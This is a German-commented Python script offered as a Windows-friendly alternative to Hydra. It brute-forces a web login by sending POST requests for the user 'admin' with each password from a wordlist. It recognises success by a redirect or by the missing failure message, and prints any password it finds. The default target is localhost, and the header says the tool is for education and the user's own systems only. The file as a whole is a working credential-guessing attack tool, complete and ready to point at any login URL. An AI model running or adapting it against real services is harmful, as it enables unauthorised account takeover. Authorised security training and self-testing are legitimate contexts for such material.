#!/usr/bin/env python3
"""
============================================
HTTP Requests Bruteforce (Hydra-Alternative)
============================================
WICHTIG: Nur für Bildungszwecke und eigene Systeme!

Alternative zu Hydra - funktioniert direkt unter Windows!
Sendet schnelle HTTP-POST-Requests (wie Hydra)

Installation:
    pip install requests

Vergleich:
    - Schneller als Selenium (keine Browser-Overhead)
    - Langsamer als Hydra (Python vs. C)
    - Funktioniert überall (keine WSL nötig)
============================================
"""

import requests
import time
from datetime import datetime

# ============================================
# KONFIGURATION
# ============================================
TARGET_URL = "http://127.0.0.1:5001/login"
USERNAME = "admin"                      # Zu testender Benutzername
PASSWORD_FILE = "passwords.txt"         # Passwortliste
FAIL_STRING = "Ungültige Eingabedaten"  # Fehlermeldung bei falschem Login
DELAY = 0.1                             # Sekunden zwischen Versuchen (0.1 = schnell)
THREADS = 1                             # Anzahl paralleler Requests (1 = sequentiell)

# ============================================
# BRUTEFORCE FUNKTION
# ============================================
def try_login(session, username, password):
    """
    Versucht Login mit gegebenen Credentials

    Returns:
        True = Login erfolgreich
        False = Login fehlgeschlagen
    """
    try:
        # POST-Request mit Login-Daten
        data = {
            "username": username,
            "password": password
        }

        response = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=5)

        # Erfolg erkennen:
        # 1. Redirect (Status 302/301) = Login erfolgreich
        # 2. Keine Fehlermeldung im Response

        if response.status_code in [301, 302]:
            # Redirect = Login erfolgreich!
            return True

        # Prüfe Response-Text auf Fehlermeldung
        if FAIL_STRING in response.text:
            return False

        # Wenn kein Redirect und keine Fehlermeldung = vermutlich erfolgreich
        if response.status_code == 200 and "Logged in" in response.text:
            return True

        return False

    except requests.exceptions.RequestException as e:
        print(f"[!] Request-Fehler: {e}")
        return False

# ============================================
# MAIN BRUTEFORCE LOOP
# ============================================
def main():
    print("=" * 60)
    print("HTTP Requests Bruteforce (Hydra-Alternative)")
    print("=" * 60)
    print(f"Target: {TARGET_URL}")
    print(f"Username: {USERNAME}")
    print(f"Password-Liste: {PASSWORD_FILE}")
    print(f"Delay: {DELAY}s zwischen Versuchen")
    print("=" * 60)
    print()

    # Passwortliste laden
    try:
        with open(PASSWORD_FILE, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] FEHLER: Passwortliste '{PASSWORD_FILE}' nicht gefunden!")
        return

    print(f"[+] {len(passwords)} Passwörter geladen")
    print()

    # Session erstellen (behält Cookies)
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    # Startzeit
    start_time = datetime.now()

    # Durch alle Passwörter iterieren
    found = False
    for i, password in enumerate(passwords, 1):
        print(f"[{i}/{len(passwords)}] Versuche: {USERNAME}:{password}", end=" ... ")

        success = try_login(session, USERNAME, password)

        if success:
            print("✓ ERFOLG!")
            print()
            print("=" * 60)
            print("PASSWORT GEFUNDEN!")
            print("=" * 60)
            print(f"Username: {USERNAME}")
            print(f"Passwort: {password}")
            print("=" * 60)
            found = True
            break
        else:
            print("✗ Fehlgeschlagen")

        # Rate Limiting: Pause zwischen Versuchen
        time.sleep(DELAY)

    # Endzeit
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()

    print()
    print("=" * 60)
    if not found:
        print("Kein Passwort gefunden!")
    print(f"Dauer: {duration:.2f} Sekunden")
    print(f"Versuche: {i}/{len(passwords)}")
    print(f"Geschwindigkeit: {i/duration:.2f} Versuche/Sekunde")
    print("=" * 60)

# ============================================
# START
# ============================================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Abgebrochen durch Benutzer (Ctrl+C)")
        print("=" * 60)
